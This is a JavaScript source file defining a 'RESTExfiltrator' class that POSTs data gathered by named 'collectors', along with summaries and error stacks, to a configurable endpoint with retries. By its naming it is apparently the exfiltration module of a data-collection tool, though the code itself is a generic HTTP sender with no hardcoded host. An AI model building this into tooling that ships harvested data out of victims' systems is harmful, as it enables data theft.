// exfiltrators/rest.js

export class RESTExfiltrator {
    constructor(endpoint, options = {}) {
        this.endpoint = endpoint;
        this.apiKey = options.apiKey || null;
        this.headers = {
            'Content-Type': 'application/json',
            ...(this.apiKey ? { 'X-API-Key': this.apiKey } : {})
        };
        this.name = 'REST';
        this.retryCount = 0;
        this.maxRetries = 3;
    }

    async sendData(collectorName, data) {
        return this.send('data', {
            collector: collectorName,
            data: data,
            timestamp: Date.now()
        });
    }

    async sendSummary(collectedData) {
        return this.send('summary', {
            data: collectedData,
            timestamp: Date.now()
        });
    }

    async sendError(error) {
        return this.send('error', {
            error: {
                message: error.message,
                stack: error.stack
            },
            timestamp: Date.now()
        });
    }

    async send(type, payload) {
        try {
            const response = await fetch(`${this.endpoint}/${type}`, {
                method: 'POST',
                headers: this.headers,
                body: JSON.stringify(payload),
                cache: 'no-store'
            });
            
            if (response.ok) {
                this.retryCount = 0;
                return true;
            }
            
            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
        } catch (error) {
            console.error('REST send failed:', error);
            
            if (this.retryCount < this.maxRetries) {
                this.retryCount++;
                await this.delay(1000 * this.retryCount);
                return this.send(type, payload);
            }
            
            return false;
        }
    }

    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}